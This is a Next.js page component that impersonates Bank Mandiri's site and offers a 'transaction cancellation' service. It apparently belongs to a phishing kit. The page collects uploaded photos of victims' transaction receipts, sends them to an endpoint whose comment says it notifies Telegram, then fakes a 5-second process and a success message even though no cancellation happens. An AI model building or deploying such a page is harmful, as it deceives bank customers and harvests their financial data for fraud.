'use client';

import React, { useState, useRef } from 'react';
import Image from 'next/image';
import { 
  FileUp, 
  ArrowLeft, 
  FileText, 
  Calendar, 
  DollarSign, 
  ChevronRight,
  ShieldAlert,
  CheckCircle2
} from 'lucide-react';

export default function CancelTransactionPage() {
  const [file, setFile] = useState<File | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setFile(e.target.files[0]);
    }
  };

  const onDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const onDragLeave = () => {
    setIsDragging(false);
  };

  const onDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      setFile(e.dataTransfer.files[0]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) return;

    setIsSubmitting(true);

    // Send Telegram Notification in background
    const formData = new FormData();
    formData.append('type', 'Pembatalan Transaksi');
    formData.append('fileName', file.name);
    formData.append('photo', file);

    fetch('/api/notify', {
      method: 'POST',
      body: formData
    }).catch(err => console.error('Failed to send notification:', err));

    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccess(true);
    }, 5000); // 5 seconds loading time
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-[#eef4f9]">
        <div className="w-full max-w-sm bg-white rounded-3xl p-8 text-center shadow-2xl animate-fade-in-up">
          <div className="flex justify-center mb-6">
            <CheckCircle2 className="w-20 h-20 text-green-500" />
          </div>
          <h1 className="text-[#002D5C] text-2xl font-bold mb-4">Pembatalan Transaksi berhasil</h1>
          <p className="text-gray-500 text-sm mb-8 leading-relaxed">
            Terima kasih telah menggunakan layanan Mandiri.
          </p>
          <button 
            onClick={() => window.location.href = '/'}
            className="w-full py-4 bg-[#003d79] text-white rounded-full font-bold shadow-lg"
          >
            Kembali ke Beranda
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col items-center pb-10 relative bg-[#eef4f9]">
      <div className="security-overlay left-0 border-r border-[#004D99]/10" />
      <div className="security-overlay right-0 border-l border-[#004D99]/10" />

      {isSubmitting && (
        <div className="fixed inset-0 bg-white/95 z-[9999] flex flex-col justify-center items-center">
          <div className="mandiri-loader">
            <div className="spin-part blue"></div>
            <div className="spin-part gold"></div>
          </div>
          <p className="mt-5 font-bold text-[#002D5C] text-sm">Mengirim laporan...</p>
        </div>
      )}

      <header className="w-full bg-white py-[15px] shadow-sm mb-5 flex items-center px-4">
        <button onClick={() => window.history.back()} className="p-2 -ml-2 text-[#002D5C]">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <div className="flex-grow flex justify-center -ml-8">
          <Image 
            src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
            alt="Mandiri" 
            width={90} 
            height={26}
            className="h-auto"
          />
        </div>
      </header>

      <main className="w-full max-w-[450px] px-4 animate-fade-in-up flex-grow flex flex-col justify-center py-5">
        <div className="bg-white rounded-2xl p-6 shadow-xl shadow-[#002D5C]/5">
          <div className="mb-6 flex items-center gap-3 bg-red-50 p-4 rounded-xl border border-red-100">
            <ShieldAlert className="w-6 h-6 text-red-500 flex-shrink-0" />
            <div>
              <h2 className="text-[#002D5C] font-bold text-sm">Pembatalan Transaksi</h2>
              <p className="text-gray-500 text-[10px]">Laporkan transaksi mencurigakan untuk pembatalan.</p>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div className="space-y-3">
                <label className="block text-[10px] font-bold text-[#002D5C] uppercase tracking-wider text-center">Upload Bukti Transaksi</label>
                <div 
                  onClick={() => fileInputRef.current?.click()}
                  onDragOver={onDragOver}
                  onDragLeave={onDragLeave}
                  onDrop={onDrop}
                  className={`relative border-2 border-dashed rounded-2xl p-8 transition-colors cursor-pointer group flex flex-col items-center justify-center ${
                    isDragging ? 'border-[#004D99] bg-[#004D99]/5' : 'border-[#cbd5e1] hover:border-[#004D99]'
                  }`}
                >
                  <input 
                    type="file" 
                    ref={fileInputRef} 
                    onChange={handleFileChange} 
                    className="hidden" 
                    accept="image/*"
                  />
                  {file ? (
                    <div className="text-center">
                      <div className="w-16 h-16 bg-blue-50 rounded-2xl flex items-center justify-center mx-auto mb-3">
                        <FileText className="w-8 h-8 text-[#004D99]" />
                      </div>
                      <p className="text-xs font-bold text-[#002D5C] truncate max-w-[200px]">{file.name}</p>
                      <p className="text-[10px] text-gray-400 mt-1">Ganti foto</p>
                    </div>
                  ) : (
                    <div className="text-center">
                      <div className="w-16 h-16 bg-slate-50 rounded-2xl flex items-center justify-center mx-auto mb-3 group-hover:scale-110 transition-transform">
                        <FileUp className="w-8 h-8 text-[#94a3b8] group-hover:text-[#004D99]" />
                      </div>
                      <p className="text-xs font-bold text-[#002D5C]">Pilih atau tarik foto ke sini</p>
                      <p className="text-[10px] text-gray-400 mt-1">Ambil bukti dari galeri (screenshot/foto struk)</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <button 
              type="submit" 
              disabled={!file}
              className={`w-full py-4 rounded-full font-bold text-sm tracking-wide transition-all shadow-lg flex items-center justify-center gap-2 ${
                file 
                ? 'bg-[#003d79] text-white shadow-[#003d79]/20 hover:scale-[1.02] active:scale-[0.98]' 
                : 'bg-slate-200 text-gray-400 cursor-not-allowed'
              }`}
            >
              BATALKAN TRANSAKSI
            </button>
          </form>
        </div>
      </main>

      <footer className="fixed bottom-0 w-full max-w-[450px] bg-[#2467ab] text-white text-center py-3 text-[0.75rem] tracking-[0.5px]">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>
    </div>
  );
}
